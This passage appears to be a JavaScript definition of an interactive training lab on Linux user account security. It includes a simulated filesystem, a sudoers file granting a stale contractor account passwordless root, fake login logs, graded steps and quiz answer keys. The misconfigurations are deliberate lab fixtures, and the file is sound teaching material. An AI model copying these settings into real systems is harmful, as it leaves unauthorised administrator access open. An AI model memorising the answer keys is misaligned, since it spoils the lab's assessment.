          { id: 'a', text: 'Forward all facilities and severities to 10.10.24.5 over UDP 514', correct: true },
          { id: 'b', text: 'Forward only kernel logs to 10.10.24.5 over TCP 514', correct: false },
          { id: 'c', text: 'Mirror all logs locally into /var/log/10.10.24.5', correct: false },
          { id: 'd', text: 'Rotate all logs every 514 minutes', correct: false },
        ],
        triggerOn: { stepId: 'sa-4.ex1.s2' },
        reinforces: 'sa-4.ex1.s2',
      },
    ],

    completion: { requireAllSteps: true, minQuizScore: 0.8 },
  };

  // ────────────────────────────────────────────────────────────
  //  sa-5  User Account Security  (IamMatrixLabShell + LinuxTerminal)
  // ────────────────────────────────────────────────────────────
  function buildSa5Iam() {
    const groups = ['wheel', 'sudo', 'staff', 'developers', 'finance', 'helpdesk', 'dba', 'audit', 'svc-accounts', 'guests', 'temp', 'backup'];
    const users = [
      { username: 'root',            groups: ['wheel'],                     lastSeen: '2026-04-26T09:00:00Z', sudoers: 'ALL=(ALL:ALL) ALL', expires: 'never', comment: 'system' },
      { username: 'j.sanders',       groups: ['staff'],                     lastSeen: '2026-04-26T08:14:05Z', sudoers: 'none', expires: 'never', comment: 'L2 SOC analyst' },
      { username: 'm.chen',          groups: ['staff', 'developers'],       lastSeen: '2026-04-26T08:52:11Z', sudoers: 'none', expires: 'never', comment: 'Senior eng' },
      { username: 'helpdesk-admin',  groups: ['sudo', 'helpdesk'],          lastSeen: '2026-04-26T09:01:00Z', sudoers: 'NOPASSWD: /usr/bin/systemctl', expires: 'never', comment: 'Helpdesk admin' },
      { username: 'svc_backup',      groups: ['svc-accounts', 'backup'],    lastSeen: '2026-04-23T02:01:00Z', sudoers: 'none', expires: 'never', comment: 'Backup service account' },
      { username: 'svc_sql',         groups: ['svc-accounts', 'dba'],       lastSeen: '2026-04-25T04:00:00Z', sudoers: 'none', expires: 'never', comment: 'SQL service account' },
      { username: 'temp.contractor', groups: ['wheel', 'temp'],             lastSeen: '2026-04-22T17:09:00Z', sudoers: 'NOPASSWD: ALL', expires: 'never', comment: 'Q1 contract — should have been removed 2026-03-31' },
      { username: 'a.morrison',      groups: ['staff'],                     lastSeen: '2025-11-18T13:42:00Z', sudoers: 'none', expires: 'never', comment: 'Departed engineer' },
      { username: 's.patel',         groups: ['staff', 'developers'],       lastSeen: '2026-04-25T17:11:00Z', sudoers: 'none', expires: 'never', comment: 'Senior eng' },
      { username: 'r.kowalski',      groups: ['developers'],                lastSeen: '2025-12-04T12:20:00Z', sudoers: 'none', expires: 'never', comment: 'On long leave' },
      { username: 'k.iyer',          groups: ['finance'],                   lastSeen: '2026-04-24T14:00:00Z', sudoers: 'none', expires: 'never', comment: 'Finance' },
      { username: 'b.howard',        groups: ['finance'],                   lastSeen: '2026-04-25T15:00:00Z', sudoers: 'none', expires: 'never', comment: 'Finance' },
      { username: 'l.tran',          groups: ['helpdesk'],                  lastSeen: '2026-04-25T16:30:00Z', sudoers: 'none', expires: 'never', comment: 'Helpdesk T1' },
      { username: 'c.flores',        groups: ['helpdesk'],                  lastSeen: '2026-04-26T08:30:00Z', sudoers: 'none', expires: 'never', comment: 'Helpdesk T1' },
      { username: 'd.brown',         groups: ['dba'],                       lastSeen: '2026-04-26T07:45:00Z', sudoers: 'none', expires: 'never', comment: 'DBA' },
      { username: 'e.kim',           groups: ['audit'],                     lastSeen: '2026-04-25T11:15:00Z', sudoers: 'none', expires: 'never', comment: 'Internal audit' },
      { username: 'f.gomez',         groups: ['developers'],                lastSeen: '2026-04-26T09:14:00Z', sudoers: 'none', expires: 'never', comment: 'Developer' },
      { username: 'g.smith',         groups: ['developers'],                lastSeen: '2026-04-25T18:00:00Z', sudoers: 'none', expires: 'never', comment: 'Developer' },
      { username: 'h.lee',           groups: ['developers'],                lastSeen: '2025-09-01T08:00:00Z', sudoers: 'none', expires: 'never', comment: 'Long-departed' },
      { username: 'i.patel',         groups: ['staff'],                     lastSeen: '2026-04-25T14:00:00Z', sudoers: 'none', expires: 'never', comment: 'PM' },
      { username: 'j.kim',           groups: ['staff'],                     lastSeen: '2026-04-25T13:00:00Z', sudoers: 'none', expires: 'never', comment: 'PM' },
      { username: 'k.zhang',         groups: ['developers'],                lastSeen: '2025-08-12T10:00:00Z', sudoers: 'none', expires: 'never', comment: 'Long-departed' },
      { username: 'l.brown',         groups: ['staff'],                     lastSeen: '2026-04-26T06:00:00Z', sudoers: 'none', expires: 'never', comment: 'Customer success' },
      { username: 'm.jones',         groups: ['staff'],                     lastSeen: '2026-04-25T22:00:00Z', sudoers: 'none', expires: 'never', comment: 'Customer success' },
      { username: 'svc_jenkins',     groups: ['svc-accounts'],              lastSeen: '2026-04-26T09:09:00Z', sudoers: 'none', expires: 'never', comment: 'CI service account' },
      { username: 'svc_metrics',     groups: ['svc-accounts'],              lastSeen: '2026-04-26T09:00:00Z', sudoers: 'none', expires: 'never', comment: 'Metrics service account' },
      { username: 'guest',           groups: ['guests'],                    lastSeen: 'never', sudoers: 'none', expires: 'never', comment: 'Default guest' },
      { username: 'old.intern',      groups: ['guests'],                    lastSeen: '2025-07-20T16:00:00Z', sudoers: 'none', expires: 'never', comment: 'Should have been disabled' },
      { username: 'x.chen',          groups: ['developers'],                lastSeen: '2026-04-25T19:30:00Z', sudoers: 'none', expires: 'never', comment: 'Developer' },
      { username: 'y.zhang',         groups: ['developers'],                lastSeen: '2026-04-26T08:30:00Z', sudoers: 'none', expires: 'never', comment: 'Developer' },
    ];
    return JSON.stringify({ groups, users });
  }

  function buildSa5Fs() {
    return {
      'home': { 'student': { '.bashrc': '' } },
      'etc': {
        'pam.d': { 'common-auth': '# /etc/pam.d/common-auth\nauth required pam_unix.so try_first_pass\n' },
        'login.defs': '# /etc/login.defs\nFAILLOG_ENAB no\nFAIL_DELAY 4\nLOGIN_RETRIES 3\n',
        'sudoers': '# /etc/sudoers\nroot ALL=(ALL:ALL) ALL\nhelpdesk-admin ALL=(ALL) NOPASSWD: /usr/bin/systemctl\ntemp.contractor ALL=(ALL) NOPASSWD: ALL  # left over from 2025 contract\n%sudo ALL=(ALL:ALL) ALL\n',
        'passwd': 'root:x:0:0:root:/root:/bin/bash\nj.sanders:x:1001:1001::/home/j.sanders:/bin/bash\ntemp.contractor:x:1099:1099::/home/temp.contractor:/bin/bash\n',
      },
      'var': {
        'lib': {
          'iam': { 'matrix.json': buildSa5Iam() },
        },
        'log': {
          'auth.log': '',
          'wtmp.txt':
            'temp.contractor pts/3        198.51.100.42    Wed Apr 22 17:09 - 18:42  (01:33)\n' +
            'helpdesk-admin  pts/0        10.10.24.7       Wed Apr 22 09:01 - 17:04  (08:03)\n' +
            'm.chen          pts/2        10.10.24.18      Wed Apr 22 08:52 - 17:18  (08:26)\n' +
            'svc_backup      cron         (none)           Tue Apr 21 02:00 - 02:01  (00:01)\n' +
            'wtmp begins Mon Apr 20 06:00:01 2026\n',
          'faillog.txt':
            'Login       Failures Maximum Latest                   On\n' +
            'root            0      0   never\n' +
            'temp.contractor 7      5   Wed Apr 22 17:03:11 -0400 2026 ssh:notty 198.51.100.42\n' +
            'svc_backup      3      0   Tue Apr 21 02:17:02 -0400 2026 cron\n' +
            'j.sanders       0      0   never\n',
        },
      },
      'tmp': {},
    };
  }

  const SA5_LAB = {
    id: 'sa-5',
    track: 'security-assessments',
    title: 'User Account Security Assessment',
    difficulty: 'Intermediate',
    estimatedTime: '60 min',
    icon: '🪪',
    tags: ['PAM', 'sudo', 'IAM', 'Account Review'],

    source: {
      repo: '0xrajneesh/Security-Assessments-projects-for-Beginners',
      file: 'project-5-User Account Security Assessment.md',
      sha256: 'bd458aefbd6caf390f2e95ff84985210d60fba730507d093793fb6e58b42bcd8',
      snapshot: 'src/data/sources/sa-5.source.md',
    },

    environment: { type: 'mixed', shell: 'LinuxTerminalShell', fs: buildSa5Fs },

    scenario: {
      role: 'You are a junior IAM analyst reviewing user accounts.',
      incident: 'HR says contractor accounts should not have administrator access. Find the contractor who still has extra privileges, remove that access, and check the login history for anything unusual.',
    },

    exercises: [
      {
        id: 'ex1',
        upstreamHeading: 'Exercise 1: Auditing User Accounts with PAM',
        steps: [
          {
            id: 'sa-5.ex1.s1',
            upstream: { exercise: 'Exercise 1', stepNumber: 1, sourceLine: 'sudo apt-get install libpam0g-dev' },
            kind: 'command',
            instruction: 'Install the PAM package used by this practice lab.',
            hint: '`sudo apt-get install libpam0g-dev`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?libpam0g-dev\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-5.ex1.s2',
            upstream: { exercise: 'Exercise 1', stepNumber: 2, sourceLine: 'Edit /etc/pam.d/common-auth to add pam_tally2.so deny=5 unlock_time=900' },
            kind: 'command',
            instruction: 'Open the login rules file and look for the failed-login lockout setting.',
            hint: '`cat /etc/pam.d/common-auth`',
            acceptedInputs: [{ type: 'regex', value: /^(less|cat|nano)\s+\/etc\/pam\.d\/common-auth\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
            checkOnLearning: 'sa5-q5',
          },
          {
            id: 'sa-5.ex1.s3',
            upstream: { exercise: 'Exercise 1', stepNumber: 3, sourceLine: 'sudo tail -f /var/log/auth.log' },
            kind: 'command',
            instruction: 'Watch the authentication log. This file records login successes and failures.',
            hint: '`sudo tail -F /var/log/auth.log`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?tail\s+-(F|f)\s+\/var\/log\/auth\.log\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
        ],
      },
      {
        id: 'ex2',
        upstreamHeading: 'Exercise 2: Checking Password Strength with chkpasswd',
        steps: [
          {
            id: 'sa-5.ex2.s1',
            upstream: { exercise: 'Exercise 2', stepNumber: 1, sourceLine: 'sudo apt-get install chkpasswd' },
            kind: 'command',
            instruction: 'Install the password-strength checker.',
            hint: '`sudo apt-get install chkpasswd`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?chkpasswd\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-5.ex2.s2',
            upstream: { exercise: 'Exercise 2', stepNumber: 2, sourceLine: 'sudo chkpasswd' },
            kind: 'analyze',
            instruction: 'Run the password check. Which service account is marked WEAK? Enter either weak username below.',
            hint: 'Look at the Strength column.',
            validation: { type: 'valueExtracted', expected: ['svc_backup', 'svc_sql'] },
            points: 10,
            checkOnLearning: 'sa5-q1',
          },
          {
            id: 'sa-5.ex2.s3',
            upstream: { exercise: 'Exercise 2', stepNumber: 3, sourceLine: 'Review password policies (length, complexity)' },
            kind: 'command',
            instruction: 'Open the login policy file and review its password settings.',
            hint: '`cat /etc/login.defs`',
            acceptedInputs: [{ type: 'regex', value: /^(less|cat|nano)\s+\/etc\/login\.defs\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
        ],
      },
      {
        id: 'ex3',
        upstreamHeading: 'Exercise 3: Auditing Sudo Permissions with sudo',
        steps: [
          {
            id: 'sa-5.ex3.s1',
            upstream: { exercise: 'Exercise 3', stepNumber: 1, sourceLine: 'sudo cat /etc/sudoers' },
            kind: 'command',
            instruction: 'Open the sudoers file. It lists who may run administrator commands.',
            hint: '`sudo cat /etc/sudoers`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?(cat|less|nano)\s+\/etc\/sudoers\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
            checkOnLearning: 'sa5-q2',
          },
          {
            id: 'sa-5.ex3.s2',
            upstream: { exercise: 'Exercise 3', stepNumber: 2, sourceLine: 'sudo -l -U username' },
            kind: 'analyze',
            instruction: 'Find the user whose line ends with NOPASSWD: ALL. Enter that username below.',
            hint: 'Look for the line ending in `NOPASSWD: ALL`.',
            validation: { type: 'valueExtracted', expected: ['temp.contractor'] },
            points: 15,
          },
          {
            id: 'sa-5.ex3.s3',
            upstream: { exercise: 'Exercise 3', stepNumber: 3, sourceLine: 'Review and adjust /etc/sudoers.d/' },
            kind: 'ui',
            environment: { shell: 'IamMatrixLabShell', shellProps: {} },
            instruction: 'Use the account table on the left. Show admin members, select temp.contractor, and confirm the wheel warning.',
            validation: { type: 'uiPath', expected: ['iam', 'filter', 'admins', 'iam', 'user', 'temp.contractor'] },
            points: 15,
          },
        ],
      },
      {
        id: 'ex4',
        upstreamHeading: 'Exercise 4: Modifying User Permissions with usermod',
        steps: [
          {
            id: 'sa-5.ex4.s1',
            upstream: { exercise: 'Exercise 4', stepNumber: 1, sourceLine: 'sudo usermod -aG groupname username' },
            kind: 'command',
            instruction: 'Practice adding a user to a group. Use the example command shown below; this is a safe simulated change.',
            hint: '`sudo usermod -aG developers j.sanders`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?usermod\s+-aG\s+\w+\s+\S+\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-5.ex4.s2',
            upstream: { exercise: 'Exercise 4', stepNumber: 2, sourceLine: 'sudo gpasswd -d username groupname' },
            kind: 'command',
            instruction: 'Fix the issue: remove temp.contractor from the wheel group.',
            hint: '`sudo gpasswd -d temp.contractor wheel`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?gpasswd\s+-d\s+temp\.contractor\s+wheel\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 15,
            checkOnLearning: 'sa5-q3',
          },
          {
            id: 'sa-5.ex4.s3',
            upstream: { exercise: 'Exercise 4', stepNumber: 3, sourceLine: 'groups username' },
            kind: 'command',
            instruction: 'Check which groups temp.contractor belongs to now. The wheel group should be gone.',
            hint: '`groups temp.contractor`',
            acceptedInputs: [{ type: 'regex', value: /^groups\s+temp\.contractor\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
        ],
      },
      {
        id: 'ex5',
        upstreamHeading: 'Exercise 5: Analyzing Failed Login Attempts with faillog',
        steps: [
          {
            id: 'sa-5.ex5.s1',
            upstream: { exercise: 'Exercise 5', stepNumber: 1, sourceLine: 'sudo faillog' },
            kind: 'analyze',
            instruction: 'Run the failed-login report. How many failures are listed for temp.contractor? Enter the number below.',
            hint: '`sudo faillog` — look at the Failures column for temp.contractor.',
            validation: { type: 'valueExtracted', expected: ['7'] },
            points: 15,
            checkOnLearning: 'sa5-q4',
          },
          {
            id: 'sa-5.ex5.s2',
            upstream: { exercise: 'Exercise 5', stepNumber: 2, sourceLine: 'sudo faillog -r -u username' },
            kind: 'command',
            instruction: 'Clear temp.contractor\'s failed-login counter after the review.',
            hint: '`sudo faillog -r -u temp.contractor`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?faillog\s+-r\s+-u\s+temp\.contractor\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-5.ex5.s3',
            upstream: { exercise: 'Exercise 5', stepNumber: 3, sourceLine: 'Edit /etc/login.defs to set FAILLOG_ENAB, FAIL_DELAY, LOGIN_RETRIES' },
            kind: 'command',
            instruction: 'Open the login policy again and confirm that failed-login tracking is enabled.',
            hint: '`cat /etc/login.defs`',
            acceptedInputs: [{ type: 'regex', value: /^(less|cat|nano)\s+\/etc\/login\.defs\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
        ],
      },
    ],

    checkOnLearning: [
      {
        id: 'sa5-q1',
        bloom: 'recall',
        question: 'Why are service accounts (e.g., svc_backup) particularly risky when they fail a strength check?',
        type: 'multi-select',
        options: [
          { id: 'a', text: 'Service accounts are often shared and rarely rotated', correct: true },
          { id: 'b', text: 'Service accounts often have broad filesystem or DB privileges', correct: true },
          { id: 'c', text: 'Service accounts can never be locked', correct: false },
          { id: 'd', text: 'A weak svc_* password is far less risky than a weak human password', correct: false },
        ],
        passThreshold: 'all-correct',
        triggerOn: { stepId: 'sa-5.ex2.s2' },
        reinforces: 'sa-5.ex2.s2',
      },
      {
        id: 'sa5-q2',
        bloom: 'comprehension',
        question: 'In sudoers syntax, what does NOPASSWD: ALL grant?',
        type: 'single-select',
        options: [
          { id: 'a', text: 'No commands can be run', correct: false },
          { id: 'b', text: 'Any command, no password challenge', correct: true },
          { id: 'c', text: 'Password-only access to the systemctl command', correct: false },
          { id: 'd', text: 'Read-only filesystem access', correct: false },
        ],
        triggerOn: { stepId: 'sa-5.ex3.s1' },
        reinforces: 'sa-5.ex3.s1',
      },
      {
        id: 'sa5-q3',
        bloom: 'analysis',
        question: 'You confirmed temp.contractor has wheel + sudoers NOPASSWD: ALL, last logged in from 198.51.100.42 (external) with 7 prior failures, and the contract ended 2026-03-31. Pick every appropriate action.',
        type: 'multi-select',
        options: [
          { id: 'a', text: 'Immediately remove the user from wheel', correct: true },
          { id: 'b', text: 'Disable the account (`usermod -L`) pending HR confirmation', correct: true },
          { id: 'c', text: 'Pull all sudo activity for that account from auth.log into the case file', correct: true },
          { id: 'd', text: 'Leave it — contractor accounts often re-engage', correct: false },
        ],
        passThreshold: 'all-correct',
        triggerOn: { stepId: 'sa-5.ex4.s2' },
        reinforces: 'sa-5.ex4.s2',
      },
      {
        id: 'sa5-q4',
        bloom: 'application',
        question: 'Faillog shows 7 failures for temp.contractor — but /etc/login.defs has FAILLOG_ENAB set to "no". What does that combination tell you?',
        type: 'single-select',
        options: [
          { id: 'a', text: 'Failures are still recorded by PAM/sshd, but the system-wide faillog mechanism is disabled — lockout is not happening here', correct: true },
          { id: 'b', text: 'The user has been correctly locked out', correct: false },
          { id: 'c', text: 'Auth attempts never reach faillog', correct: false },
          { id: 'd', text: 'The 7-failure count is fabricated', correct: false },
        ],
        triggerOn: { stepId: 'sa-5.ex5.s1' },
        reinforces: 'sa-5.ex5.s1',
      },
      {
        id: 'sa5-q5',
        bloom: 'comprehension',
        question: 'You reviewed `/etc/pam.d/common-auth` and did not see a `pam_tally2.so deny=5 unlock_time=900` line. What control is missing?',
        type: 'single-select',
        options: [
          { id: 'a', text: 'An account lockout policy after repeated failed logins', correct: true },
          { id: 'b', text: 'Disk encryption for home directories', correct: false },
          { id: 'c', text: 'A sudoers command whitelist', correct: false },
          { id: 'd', text: 'Password hashing with yescrypt', correct: false },
        ],
        triggerOn: { stepId: 'sa-5.ex1.s2' },
        reinforces: 'sa-5.ex1.s2',
      },
    ],

    completion: { requireAllSteps: true, minQuizScore: 0.8 },
  };

  // ────────────────────────────────────────────────────────────
  //  Register
  // ────────────────────────────────────────────────────────────
  Object.assign(window.MISSION_NEXT_LABS = window.MISSION_NEXT_LABS || {}, {
    'sa-1': SA1_LAB,
    'sa-2': SA2_LAB,
    'sa-3': SA3_LAB,
    'sa-4': SA4_LAB,
    'sa-5': SA5_LAB,
  });

  Object.assign(window, {
    MISSION_NEXT_SA_1: SA1_LAB,
    MISSION_NEXT_SA_2: SA2_LAB,
    MISSION_NEXT_SA_3: SA3_LAB,
    MISSION_NEXT_SA_4: SA4_LAB,
    MISSION_NEXT_SA_5: SA5_LAB,
  });
})();
